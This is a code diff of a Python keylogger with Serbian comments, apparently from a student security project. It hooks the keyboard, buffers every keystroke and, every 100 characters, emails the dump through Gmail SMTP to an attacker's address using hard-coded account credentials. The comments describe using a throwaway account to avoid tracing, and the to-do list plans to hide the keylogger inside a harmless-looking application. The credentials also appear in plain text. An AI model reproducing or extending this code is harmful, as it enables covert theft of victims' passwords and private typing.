@@ -1,23 +1,56 @@
 import pythoncom, pyHook
-import os
-import sys
 import threading
 import smtplib
 import datetime,time
 
+# Globalni bafer u koji cuvamo keylogove
 data = ''
 
+# Klasa zaduzena za logovanje i slanje dumpa na email adresu napadaca
+class TimerClass(threading.Thread):
+    def run(self):
+            global data                                                     # Preuzimamo bafer za slanje na mail
+            ts = datetime.datetime.now()                                    # TIMESTAMP
+            SERVER = "smtp.gmail.com"                                       # Ovom linijom dajemo server na koji saljemo, u ovom slucaju koristicemo gmail, i protokol Simple Mail Transfer Protocol
+            PORT = 587                                                      # SMTP Protokol za slanje maila podrazumevano je 587, mada postoji jos opcija
+            USER="testtestera99@gmail.com"                                  # Mail adresa sa koje cemo poslati logove
+            PASS="stolica123"                                               # Lozinka naloga, koristimo fresh nalog da se izbegne mogucnost pracenja, nalog ne sadrzi informacije o napadacu
+            FROM = USER                                                     # FROM segment mejla jeste nas ulogovani nalog
+            TO = "milovanovicmmilos99@gmail.com"                            # TO segment je mail na koji saljemo dump
+            SUBJECT = "Keylogger data @timestamp{" + str(ts) + "}:"         # Subject je naziv teme maila
+            MESSAGE = data                                                  # MESSAGE jeste sam dump
+            # Sledi formiranje maila koji je zapravo obican string, kako bi ispravno bili prikazani from, to, subject i body maila
+            message = """\
+From: %s
+To: %s
+Subject: %s
+%s
+""" % (FROM, TO, SUBJECT, MESSAGE)
+            try:
+                server = smtplib.SMTP()                                     # Kreiramo objekat SMTP klijenta iz smtplib paketa
+                server.connect(SERVER, PORT)                                # Povezujemo se klijentom i datim portom
+                print('Uspesno povezan na server')
+                server.starttls()                                           # TLS protokol je zaduzen za enkripciju i bezbedan transport
+                server.login(USER, PASS)                                    # Pokusaj da se ulogujemo na mail nalog
+                print('Uspesno ulogovan')
+                server.sendmail(FROM, TO, message)                          # Pokusaj slanja maila
+                data=''                                                     # Cistimo bafer kako bi mogao da primi nove logove
+                server.quit()                                               # Zatvaramo server
+                print('Mejl poslat')
+            except Exception as e:
+                print(e)
+
+# Izmenjena funkcija logovanja svakog karaktera ponaosob, odradjeno putem konkatenacije na globalni bafer
 def keyPressed(event):
     global data
 
     key = chr(event.Ascii)
     data = data + key
 
-    if len(data) > 10:
-        fp = open("C:\\Users\\Milos Milovanovic\\Desktop\\Sbes proj\\sigurnost\\log.txt", "a")
-        fp.write(data)
-        fp.close()
-        data = ''
+    # Na svakih 100 karaktera saljemo dump na mail
+    if len(data) > 100:
+        emailClient = TimerClass()
+        emailClient.run()
 
     return True
 
@@ -26,46 +59,6 @@ obj.KeyDown = keyPressed
 obj.HookKeyboard()
 pythoncom.PumpMessages()
 
-'''
-#Email Logs
-class TimerClass(threading.Thread):
-    def __init__(self):
-        threading.Thread.__init__(self)
-        self.event = threading.Event()
-    def run(self):
-        while not self.event.is_set():
-            global data
-            if len(data)>10:
-                ts = datetime.datetime.now()
-                SERVER = "smtp.gmail.com" #Specify Server Here
-                PORT = 587 #Specify Port Here
-                USER="mmilos015@gmail.com"#Specify Username Here 
-                PASS="milos milovanovic je iz kljajiceva123"#Specify Password Here
-                FROM = USER#From address is taken from username
-                TO = "milovanovicmmilos99@gmail.com" #Specify to address.Use comma if more than one to address is needed.
-                SUBJECT = "Keylogger data: "+str(ts)
-                MESSAGE = data
-                message = """\
-From: %s
-To: %s
-Subject: %s
-%s
-""" % (FROM, TO, SUBJECT, MESSAGE)
-                try:
-                    server = smtplib.SMTP()
-                    server.connect(SERVER,PORT)
-                    print('Uspesno povezan na server')
-                    server.starttls()
-                    server.login(USER,PASS)
-                    print('Uspesno ulogovan')
-                    server.sendmail(FROM, TO, message)
-                    data=''
-                    server.quit()
-                except Exception as e:
-                    print(e)
-            self.event.wait(120)
-'''
-
-# 1. SKRIPTU KOMPAJLIRATI U EXE FAJL POMOCU PYINSTALLERA
-# 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA MAIL ACCOUNT
-# 3. MOZDA SKONTATI KAKO PRIKRITI PROCES
+# 1. SKRIPTU KOMPAJLIRATI U EXE FAJL POMOCU PYINSTALLERA [x]
+# 2. UBACITI FUNKCIONALNOST SLANJA DUMPA NA MAIL ACCOUNT [x]
+# 3. SAKRITI KEYLOGGER U JEDNOSTAVNU APLIKACIJU
